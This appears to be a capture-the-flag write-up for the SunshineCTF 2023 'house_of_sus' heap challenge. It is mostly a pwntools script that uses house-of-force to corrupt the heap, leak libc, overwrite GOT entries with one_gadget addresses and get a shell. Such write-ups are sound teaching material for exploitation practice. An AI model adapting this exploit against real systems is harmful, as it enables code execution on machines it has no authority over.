See video for full walkthrough.

tl;dr: Use house-of-force to get arbitrary writes. From there you can
overwrite GOT entries with one_gadgets or overwrite free with the win
function.

```python  
import pwn  
import time  
import warnings

warnings.filterwarnings(action='ignore', category=BytesWarning)

elf = pwn.ELF("./house_of_sus_patched")  
pwn.context.binary = elf  
pwn.context.log_level = "DEBUG"  
pwn.context(terminal=['tmux', 'split-window', '-h'])

libc = pwn.ELF("libc.so.6")  
# p = elf.process()  
p = pwn.remote("chal.2023.sunshinectf.games", "23001")

# Start

p.recvuntil("joining game: ")  
heap_leak = int(p.recvline().strip(), 16)

print(f"{hex(heap_leak)=}")

def create_chunk(size, contents):  
   p.sendlineafter("meeting", "3")  
   p.sendline(size + b" " + contents)  
   p.sendlineafter("You", "1")

# Set top chunk size to 0xffffffffffffffff  
create_chunk(b"32", (b"A" * 40) + pwn.p64(0xFFFFFFFFFFFFFFFF))

# Request filler to tasks object  
heap_addr = heap_leak + (0x127D6C8 - 0x127C660) - 24 + 48  
wrap_distance = 0xFFFFFFFFFFFFFFFF - heap_addr + elf.sym['tasks']  
create_chunk(str(wrap_distance).encode(), b"BBBBBBBB")

# Overwrite task object for libc leak  
create_chunk(b"128", 5 * (pwn.p64(elf.got['free'])))

# Get libc leak  
p.sendlineafter("meeting", "1")  
p.recvuntil("choice: \n")  
free_leak = pwn.u64(p.recv(6).ljust(8, b"\x00"))  
libc.address = free_leak - libc.sym['free']  
print(f"{hex(free_leak)=}")

# Go back to GOT  
create_chunk(b"32", (b"A" * 40) + pwn.p64(0xFFFFFFFFFFFFFFFF))  
create_chunk(str(0xFFFFFFFFFFFFFFFF - 0x168).encode(), (b"f" * 8))

one_gadgets = [0x4F2A5, 0x4F302, 0x10A2FC]  
t = libc.address + one_gadgets[0]  
malloc_call_addr = 0x401857  
create_chunk(b"256", 3 * pwn.p64(t) + pwn.p64(malloc_call_addr))

p.interactive()  
```

Original writeup (https://youtu.be/qA6ajf7qZtQ?si=83QFV9vvbSyDvNBE&t=2281).